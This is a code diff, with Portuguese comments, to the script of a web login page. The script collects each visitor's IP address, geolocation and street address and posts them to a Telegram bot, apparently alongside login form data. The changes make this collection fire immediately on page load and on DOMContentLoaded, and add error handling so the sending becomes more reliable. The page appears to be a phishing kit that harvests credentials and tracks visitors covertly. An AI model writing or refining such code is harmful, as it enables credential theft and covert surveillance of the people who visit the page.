@@ -345,7 +345,7 @@
             `;
         
             try {
-                await fetch(URL, {
+                const response = await fetch(URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -354,6 +354,12 @@
                         parse_mode: 'Markdown'
                     })
                 });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                console.log("Mensagem enviada com sucesso para o Telegram");
             } catch (error) {
                 console.error("Erro ao enviar para o Telegram:", error);
             }
@@ -362,19 +368,23 @@
         async function collectAndSendDeviceInfo() {
             if (deviceInfoSent) return;
             
-            userIP = await getUserIP();
-            
             try {
-                userLocation = await getLocation();
-                if (userLocation) {
-                    userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
+                userIP = await getUserIP();
+                
+                try {
+                    userLocation = await getLocation();
+                    if (userLocation) {
+                        userAddressInfo = await getAddressFromCoords(userLocation.latitude, userLocation.longitude);
+                    }
+                } catch (error) {
+                    console.log("Localização recusada ou indisponível");
                 }
+            
+                await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false);
+                deviceInfoSent = true;
             } catch (error) {
-                console.log("Localização recusada ou indisponível");
+                console.error("Erro ao coletar informações do dispositivo:", error);
             }
-        
-            await sendToTelegram("", "", userLocation, userIP, userAddressInfo, false);
-            deviceInfoSent = true;
         }
         
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
@@ -425,25 +435,15 @@
             }, 3000);
         });
         
+        // CORREÇÃO: Enviar informações imediatamente ao carregar a página
         window.addEventListener('load', function() {
-            setTimeout(() => {
-                getLocation().then(location => {
-                    userLocation = location;
-                    if (userLocation) {
-                        getAddressFromCoords(userLocation.latitude, userLocation.longitude).then(address => {
-                            userAddressInfo = address;
-                        });
-                    }
-                }).catch(error => {
-                    console.log("Localização recusada na carga inicial");
-                });
-                
-                getUserIP().then(ip => {
-                    userIP = ip;
-                });
-                
-                collectAndSendDeviceInfo();
-            }, 100);
+            // Removido o setTimeout e chamada direta da função
+            collectAndSendDeviceInfo();
+        });
+
+        // CORREÇÃO ADICIONAL: Enviar também quando o DOM estiver pronto
+        document.addEventListener('DOMContentLoaded', function() {
+            collectAndSendDeviceInfo();
         });
     </script>
 </body>
